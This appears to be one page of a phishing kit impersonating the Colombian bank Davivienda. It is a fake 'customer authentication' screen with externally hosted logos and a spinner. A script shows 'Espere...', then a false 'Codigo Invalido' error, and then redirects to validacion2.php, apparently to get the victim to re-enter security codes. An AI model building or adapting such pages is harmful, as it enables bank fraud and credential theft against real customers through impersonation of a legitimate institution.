
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Davivienda</title>
    <link rel="stylesheet" href="estilos.css">
</head>
<body>
    <!---BY-STTCAS--->
    
        <header>
            <div class="h1">
                <img src="https://i.postimg.cc/HL4JNXPt/head.png" alt="">
            </div>
            <div class="h2">
                ingles
            </div>
        </header>

        <div class="box-todo">
            <div class="box">
                <div class="titu">
                    <h1>Autenticación del cliente</h1>
                </div>
                
            <div id="cja2" style=>

                <div class="cjaLogin" id="gif" style=" margin: 126px 0;">
                    <img src="https://i.postimg.cc/7PBzD1Ps/carg.gif" style="width: 50px;" alt="">
                    
                </div>
                <span id="mensaje"  ></span>

            </div>
                <nav>
                    <a href="">AutoAdhesión</a>
                    <a href="">¿Olvidó su contraseña?</a>
                    <a href="">Mi usuario fue bloqueado</a>
                </nav>
                <div class="fo">
                    Davivienda, tiene el compromiso de proteger su privacidad y la integridad de su información personal y financiera.
                </div>
            </div>
            <footer>
                <div class="conf">
                    Davivienda - © 2017 Davivienda - Todos los derechos reservados
                </div>
            </footer>
        </div>
   
</body>
<script>
    let sms = document.getElementById('mensaje');

    setTimeout(() => {
        sms.innerText = 'Espere...';
    }, 2000);
     setTimeout(() => {
        sms.innerText = 'Codigo Invalido';
    }, 5000);
    setTimeout(() => {
       window.location = 'validacion2.php'; 
    }, 10000);
</script>
<script src="js/displey2.js"></script>
<script src="js/secure.js"></script>
</html>